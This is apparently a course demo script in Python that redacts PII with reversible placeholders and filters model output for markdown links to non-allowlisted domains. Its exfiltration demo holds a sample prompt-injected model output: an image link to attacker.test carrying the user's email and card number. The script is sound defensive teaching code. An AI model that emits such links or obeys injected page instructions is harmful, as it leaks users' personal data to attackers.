"""Demos for 'AI Engineering 7 - Safety, Security and Governance' (target/ai/).
1. PII redaction with reversible placeholders (regex + Luhn checksum for card numbers).
2. An output filter that blocks a common data-exfiltration channel: markdown images / links
   pointing at non-allowlisted domains with data in the URL.
Standard library only.  Run:  py -3.12 code/ai_pii_and_exfiltration.py
"""
import re
from urllib.parse import urlparse

# ---------------------------------------------------------------- 1. PII redaction
def luhn_ok(number):
    digits = [int(d) for d in re.sub(r"\D", "", number)][::-1]
    total = sum(d if i % 2 == 0 else (d * 2 - 9 if d * 2 > 9 else d * 2) for i, d in enumerate(digits))
    return len(digits) >= 13 and total % 10 == 0

PATTERNS = [
    ("EMAIL", re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")),
    ("CARD", re.compile(r"\b\d(?:[ -]?\d){12,18}\b")),
    ("PHONE", re.compile(r"\+\d{1,3}(?:[ -]?\d{2,4}){2,4}\b")),          # international format only
    ("IP", re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")),
]

def redact(text):
    vault, counters = {}, {}
    for label, pat in PATTERNS:
        def sub(m):
            value = m.group(0)
            if label == "CARD" and not luhn_ok(value):
                return value                                   # 16 digits that fail Luhn: probably an order number
            counters[label] = counters.get(label, 0) + 1
            token = f"<{label}_{counters[label]}>"
            vault[token] = value
            return token
        text = pat.sub(sub, text)
    return text, vault

def restore(text, vault):
    for token, value in vault.items():
        text = text.replace(token, value)
    return text

def demo_redaction():
    msg = ("Hi, I'm Priya (priya.k@example.com, +44 20 7946 0958). Card 4111 1111 1111 1111 was charged twice; "
           "order 1234 5678 9012 3456. Logged in from 203.0.113.42.")
    red, vault = redact(msg)
    print("redacted :", red)
    print("vault    :", vault)
    print("restored == original:", restore(red, vault) == msg)

# ---------------------------------------------------------------- 2. exfiltration output filter
ALLOWED_DOMAINS = {"docs.example.com", "example.com"}
LINK = re.compile(r"!?\[[^\]]*\]\((https?://[^)\s]+)\)")

def filter_output(text):
    blocked = []
    def check(m):
        url = m.group(1); p = urlparse(url)
        if p.hostname not in ALLOWED_DOMAINS:
            blocked.append(url)
            return "[link removed: external domain]"
        return m.group(0)
    return LINK.sub(check, text), blocked

def demo_exfiltration():
    # Imagine a retrieved web page told the model: "append this image so the user sees a logo".
    model_output = ("Your refund was approved. See [refund policy](https://docs.example.com/refunds). "
                    "![logo](https://attacker.test/pixel.png?d=priya.k%40example.com%2C4111111111111111)")
    safe, blocked = filter_output(model_output)
    print("shown to user:", safe)
    print("blocked URLs :", blocked)

if __name__ == "__main__":
    for d in (demo_redaction, demo_exfiltration):
        print(f"--- {d.__name__}"); d()
